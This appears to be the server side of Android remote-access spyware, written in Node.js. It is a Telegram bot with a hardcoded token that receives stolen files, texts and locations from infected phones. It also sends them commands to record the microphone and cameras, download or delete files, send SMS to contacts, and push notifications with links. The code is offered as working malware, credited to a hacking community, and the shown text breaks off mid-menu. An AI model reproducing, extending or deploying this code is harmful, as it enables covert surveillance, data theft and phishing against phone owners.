const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8852610434:AAEB0aKFcasHrEVl6CwJlgc9Zq-eeA2quKs'
const id = '8155201188'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Hacking Community➩ @hackingteamx </p>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• 🤡𝐆𝐎𝐓 𝐀 𝐍𝐄𝐖 𝐏𝐇𝐎𝐍𝐄🤡\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• 😫𝐏𝐇𝐎𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐆𝐎𝐍𝐄😖\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 🗯️𝐑𝐞𝐩𝐥𝐲 𝐎𝐟 𝐘𝐨𝐮𝐫 𝐕𝐢𝐜𝐭𝐢𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🌨️')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 🏜️𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🌲\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 🏜️𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🌲')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 🔄𝐄𝐍𝐓𝐄𝐑 𝐓𝐇𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐘𝐎𝐔 𝐖𝐀𝐍𝐓 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒👨‍👩‍👧‍👧')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝📻')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 🌠𝐆𝐢𝐯𝐞 𝐓𝐡𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐞𝐥𝐞𝐭𝐞🗑️')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 🕍𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐓𝐢𝐦𝐞 𝐨𝐟  𝐘𝐨𝐮  𝐖𝐚𝐧𝐭 𝐑𝐞𝐜𝐨𝐫𝐝 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞🦮')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 🎢𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐌𝐚𝐢𝐧 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🏠')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 🚒𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐒𝐞𝐥𝐟𝐞 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🚆')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 🎒𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐒𝐌𝐒 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐡𝐨𝐰 𝐨𝐧 𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞☂️')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 🦊𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧👹')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• 🐼𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐞 𝐎𝐩𝐞𝐧𝐞𝐝 𝐛𝐲 𝐓𝐡𝐞 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 🎅\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 🐼𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐞 𝐎𝐩𝐞𝐧𝐞𝐝 𝐛𝐲 𝐓𝐡𝐞 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 🎅')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 📞𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐀𝐮𝐝𝐢𝐨 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐏𝐥𝐚𝐲♑')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°•🌹𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐒𝐄𝐑𝐕𝐄𝐑🌷\n\n' +
                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
                '• 🍀 Developer 👉 @hackingteamx ⚔️\n\n' +
                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                let text = '°• 🎮𝐋𝐢𝐬𝐭 𝐎𝐟 𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 🎞️ :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• ⚖️𝐒𝐞𝐥𝐞𝐜𝐭 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐅𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞📱', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• ❌𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐃𝐞𝐧𝐢𝐞𝐝🚫')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• 🪣𝐒𝐞𝐥𝐞𝐜𝐭 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐅𝐨𝐫 𝐓𝐡𝐢𝐬 𝐌𝐚𝐜𝐡𝐢𝐧𝐞📬 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '🍏𝐀𝐏𝐏𝐒🍏', callback_data: `apps:${uuid}`},
                        {text: '⚽𝐏𝐇𝐎𝐍𝐄 𝐈𝐍𝐅𝐎⚽', callback_data: `device_info:${uuid}`}
                    ],
                    [
